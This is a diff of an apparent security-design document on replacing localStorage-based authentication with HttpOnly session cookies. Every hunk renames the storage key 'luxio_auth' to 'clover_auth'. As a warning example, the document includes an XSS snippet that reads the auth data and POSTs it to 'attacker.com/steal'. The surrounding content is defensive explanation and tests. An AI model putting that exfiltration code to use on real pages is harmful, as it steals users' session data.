@@ -13,7 +13,7 @@ The previous authentication implementation stored user information in `localStor
 
 ```javascript
 // Malicious script injected via XSS can steal ALL user data
-const authData = localStorage.getItem('luxio_auth');
+const authData = localStorage.getItem('clover_auth');
 fetch('https://attacker.com/steal', {
   method: 'POST',
   body: authData  // Sends user info to attacker
@@ -42,7 +42,7 @@ Set-Cookie: SESSION_ID=xyz789; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Ag
 #### 2. Client-Side In-Memory State
 
 **What changed:**
-- ❌ Removed: `localStorage.setItem('luxio_auth', ...)`
+- ❌ Removed: `localStorage.setItem('clover_auth', ...)`
 - ✅ Added: In-memory state only (lost on page refresh)
 - ✅ Added: Automatic session re-validation from backend
 
@@ -185,7 +185,7 @@ authStore.subscribe(callback);
 
 ```bash
 # 1. Verify no localStorage usage
-console.log(localStorage.getItem('luxio_auth'))  # Should be null
+console.log(localStorage.getItem('clover_auth'))  # Should be null
 
 # 2. Check cookie flags (DevTools → Application → Cookies)
 #    - HttpOnly: ✓
@@ -207,7 +207,7 @@ console.log(document.cookie)  # Should NOT show session cookie
 describe('Secure Authentication', () => {
   test('should not use localStorage', () => {
     authStore.setUser(mockUser);
-    expect(localStorage.getItem('luxio_auth')).toBeNull();
+    expect(localStorage.getItem('clover_auth')).toBeNull();
   });
 
   test('should validate session on init', async () => {
